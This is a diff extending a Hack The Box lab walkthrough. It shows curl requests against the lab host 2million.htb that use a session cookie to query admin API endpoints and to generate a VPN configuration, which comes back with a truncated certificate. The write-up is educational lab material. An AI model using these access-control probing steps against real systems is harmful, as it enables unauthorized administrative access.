@@ -413,3 +413,72 @@ API Routes
 }
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5366cdd3-3806-4c4e-ad45-b518cb9fe6ca)
+
+```shell
+> curl -vvv http://2million.htb/api/v1/admin/auth -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json"
+* processing: http://2million.htb/api/v1/admin/auth
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> GET /api/v1/admin/auth HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.2.1
+> Accept: */*
+> Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj
+> Content-Type: application/json
+> 
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Wed, 11 Oct 2023 05:02:45 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+* Connection #0 to host 2million.htb left intact
+{"message":true}%                    
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a2be69ef-34a1-4ef2-9c98-c504adb77a6e)
+
+Exporing the Dashboard
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/64be9cc8-6272-44bc-be1a-3ea14573ae81)
+
+Generate VPN
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5ab784e2-8771-4c2e-ac87-01fffa9a42fd)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fb1aa693-073f-4fa9-8da3-a3b438d00deb)
+
+```shell
+> curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json"
+{"status":"danger","message":"Missing parameter: username"}%                                                                                   
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ca647c15-72b2-41db-8c05-f9c8cf7e1ce1)
+
+```shell
+> curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" -d '{"username":"attacker"}'
+client
+dev tun
+proto udp
+remote edge-eu-free-1.2million.htb 1337
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+comp-lzo
+verb 3
+data-ciphers-fallback AES-128-CBC
+data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+tls-cipher "DEFAULT:@SECLEVEL=0"
+auth SHA256
+key-direction 1
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
+BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
+bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
+<-- SNIP -->
+```
+
+Moving to BurpSuite
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b30f9d8d-de64-45f0-ba04-be6b5f03d317)
